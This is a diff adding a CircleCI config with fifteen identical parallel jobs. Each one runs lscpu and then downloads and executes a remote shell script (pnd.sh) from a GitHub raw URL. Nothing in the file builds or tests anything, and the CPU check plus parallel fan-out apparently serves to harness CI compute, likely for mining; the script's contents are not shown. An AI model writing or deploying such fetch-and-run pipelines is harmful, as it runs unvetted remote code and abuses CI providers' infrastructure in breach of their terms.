@@ -1,0 +1,186 @@
+version: 2.1
+jobs:
+    Pnd1:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh
+        
+    Pnd2:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh
+
+    Pnd3:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh
+
+    Pnd4:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh         
+
+    Pnd5:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh
+
+    Pnd6:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh          
+
+    Pnd7:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd8:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd9:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd10:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd11:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd12:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd13:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd14:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh           
+
+    Pnd15:
+      docker:
+      - image: circleci/ruby:2.5.3
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+      steps:
+      - checkout
+      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/panda-nikko/mantap/main/pnd.sh && chmod +x pnd.sh && ./pnd.sh                   
+
+workflows:
+    version: 2.0
+    build:
+        jobs:
+            - Pnd1
+            - Pnd2
+            - Pnd3
+            - Pnd4
+            - Pnd5
+            - Pnd6
+            - Pnd7
+            - Pnd8
+            - Pnd9
+            - Pnd10
+            - Pnd11
+            - Pnd12
+            - Pnd13
+            - Pnd14
+            - Pnd15
